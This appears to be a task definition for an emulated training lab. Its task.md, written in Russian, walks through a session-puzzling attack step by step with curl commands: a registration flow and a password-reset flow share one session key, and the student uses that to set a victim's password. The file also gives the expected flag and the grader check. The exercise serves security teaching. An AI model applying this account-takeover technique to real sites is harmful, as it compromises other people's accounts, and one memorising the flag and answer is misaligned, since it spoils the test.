@@ -1,0 +1,42 @@
+{
+  "id": "web-session-puzzling",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s3ss10n_puzzl1ng_cr0ss_fl0w}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: session puzzling\n\nРазные флоу приложения используют ОДИН ключ сессии `pending` для разных\nцелей: регистрация хранит там email нового пользователя, сброс пароля —\nemail восстанавливаемого. Перезапиши ключ одним флоу и прочитай другим.\n\n1. Начни регистрацию (ключ `pending=attacker@x.com`):\n   curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'\n2. Запусти сброс для ЖЕРТВЫ той же cookie (ключ перезаписан):\n   curl -s -b jar -c jar -X POST https://t/forgot -d 'email=victim@corp.com'\n3. Заверши регистрацию — пароль установится жертве:\n   curl -s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'\n4. В ответе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция t/register и /forgot)",
+      "cases": [
+        {
+          "match": "register/step2",
+          "example": "-s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'",
+          "output": "{\"ok\":true,\"user\":\"victim@corp.com\",\"note\":\"password set for pending account (session key reused)\",\"flag\":\"nto{s3ss10n_puzzl1ng_cr0ss_fl0w}\"}\n"
+        },
+        {
+          "match": "forgot",
+          "example": "-s -b jar -c jar -X POST https://t/forgot -d 'email=victim@corp.com'",
+          "output": "{\"status\":\"sent\",\"pending\":\"victim@corp.com\"}\n"
+        },
+        {
+          "match": "register/step1",
+          "example": "-s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'",
+          "output": "{\"step\":\"password\",\"pending\":\"attacker@x.com\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /register/step1, /register/step2 и /forgot на t.\n"
+    }
+  }
+}
